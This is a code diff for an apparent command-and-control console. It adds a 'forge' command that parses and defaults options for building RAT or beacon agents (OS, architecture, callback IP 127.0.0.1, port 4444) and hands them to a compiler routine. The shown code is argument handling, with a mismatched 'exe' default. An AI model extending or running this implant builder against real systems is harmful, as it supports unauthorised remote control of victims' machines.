@@ -1,4 +1,5 @@
 #include "messages.h"
+#include "forge/compiler.c"
 #include <string.h>
 
 
@@ -50,12 +51,14 @@ int isUse(char* input) {
 // C2: FORGE
 //////////////////////////////////////////////////////////////////////////////////////////
 
+// Check if input string is forge command
 int isForge(char* input) {
     return input[0] == 'f' && input[1] == 'o' && input[2] == 'r' && input[3] == 'g' && input[4] == 'e';
 }
 
-int getNextIndexOf(int index, char c, char* input) {
-    int i = index;
+// Return index of next instance of char c in input string
+int getNextIndexOf(int startIndex, char c, char* input) {
+    int i = startIndex;
     while (i < strlen(input)) {
         if (input[i] == c)
             return i;
@@ -64,6 +67,7 @@ int getNextIndexOf(int index, char c, char* input) {
     return i;
 }
 
+// Return char* of next word in input string separated by ' ', '\0', or '\n'
 char* getNextWord(int index, char* input) {
 
     int i = index;
@@ -133,8 +137,43 @@ char** parseForgeInput(char* input) {
     free(flag);
     free(arg);
 
-    printf("forge -a %s -f %s -os %s -arch %s -ip %s -p %s\n", arguments[0], arguments[1], arguments[2], arguments[3], arguments[4], arguments[5]);
     return arguments;
+}
+
+char** setDefaulArgumentsIfNull(char** arguments) {
+    if (arguments[0] == NULL) {
+        printf("Agent (-a) not set, default to: rat\n");
+        arguments[0] = "rat";
+    }
+    if (arguments[1] == NULL) {
+        printf("Format (-f) not set, default to: exe\n");
+        arguments[1] = "";
+    }
+    if (arguments[2] == NULL) {
+        printf("Operating System (-os) not set, default to: linux\n");
+        arguments[2] = "linux";
+    }
+    if (arguments[3] == NULL) {
+        printf("Architecture (-arch) not set, default to: x86_64\n");
+        arguments[3] = "x86_64";
+    }
+    if (arguments[4] == NULL) {
+        printf("IP Address (-ip) not set for beacon / rat agent, default to: 127.0.0.1");
+        arguments[4] = "127.0.0.1";
+    }
+    if (arguments[5] == NULL) {
+        printf("Port (-p) not set for beacon / rat agent, default to: 4444");
+        arguments[5] = "4444";
+    }
+    return arguments;
+}
+
+void processForgeInput(char* input) {
+    char** arguments = parseForgeInput(input);
+    arguments = setDefaulArgumentsIfNull(arguments);
+    if (argumentsValid(arguments))
+        compile(arguments);
+    free(arguments);
 }
 
 
@@ -155,7 +194,7 @@ int parse_c2(char *input) {
         printf("rm\n");                     // TODO Implement
     }
     else if (isForge(input)) {              // Forge
-        parseForgeInput(input);             // TODO Implement
+        processForgeInput(input);
     }
     else if (isUse(input)) {                // Use
         printf("Use\n");                    // TODO Implement
